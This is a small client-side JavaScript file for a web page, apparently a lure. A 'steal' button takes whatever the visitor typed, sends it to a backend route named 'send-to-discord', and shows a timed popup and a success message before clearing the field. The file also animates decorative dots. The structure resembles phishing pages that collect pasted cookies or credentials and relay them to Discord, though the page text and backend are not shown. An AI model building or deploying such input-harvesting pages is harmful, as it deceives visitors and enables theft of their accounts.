document.querySelector('.steal-button').addEventListener('click', () => {
  const popup = document.querySelector('.popup');
  const successMessage = document.querySelector('.success-message');
  const inputText = document.querySelector('.input-box').value;


  popup.style.display = 'flex';
  setTimeout(() => successMessage.style.display = 'block', 6000);


  if (inputText.trim()) {
    fetch('/api/send-to-discord', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ inputText }),
    })
      .then(res => res.ok ? console.log('Sent to Discord!') : console.error('Server error'))
      .catch(err => console.error('Network error:', err));
  }


  setTimeout(() => {
    popup.style.display = 'none';
    successMessage.style.display = 'none';
    document.querySelector('.input-box').value = '';
  }, 11000);
});


const dots = document.querySelector('.dots');
let [posX, posY, dirX, dirY] = [0, 0, 1, 1];
const animateDots = () => {
  posX += 0.5 * dirX; posY += 0.5 * dirY;
  if (Math.abs(posX) > 50) dirX *= -1;
  if (Math.abs(posY) > 50) dirY *= -1;
  dots.style.transform = `translate(${posX}px, ${posY}px)`;
  requestAnimationFrame(animateDots);
};
animateDots();
